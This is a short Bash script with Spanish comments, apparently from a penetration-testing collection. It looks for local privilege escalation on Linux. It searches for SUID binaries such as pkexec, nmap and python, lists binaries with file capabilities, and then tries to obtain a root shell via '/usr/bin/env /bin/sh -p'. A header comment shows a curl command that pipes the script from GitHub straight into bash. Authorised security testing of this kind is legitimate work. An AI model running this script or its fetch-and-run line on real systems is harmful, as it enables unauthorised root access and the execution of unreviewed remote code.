#!/bin/bash

# Ejecución remota:
#  curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/3-Elevate/CheckPriv.sh | bash

fPermisosSuid() {
  echo ""
  echo "  Buscando binarios con bit setuid (perm 4000)..."
  echo ""
  vResultado=$(find / -perm -4000 2>/dev/null)
  echo -e "$vResultado" | grep -E 'pkexec|nmap|python'
}

fCapabilities() {
  echo ""
  echo "  Buscando binarios con capacidades..."
  echo ""
  vResultado=$(getcap -r / 2>/dev/null)
  echo -e "$vResultado" | grep -E 'python|ruby'
}

fEnv() {
  echo ""
  echo -e "\nIntentando ser root con env..."
  echo ""
  /usr/bin/env /bin/sh -p 2>/dev/null
  if [ "$(id -u)" -ne 0 ]; then
    echo -e "No se pudo"
  else
    echo -e "Vulnerabilidad encontrada"
    echo -e "Comando: /usr/bin/env /bin/sh -p"
  fi

}

fPermisosSuid
fCapabilities
fEnv

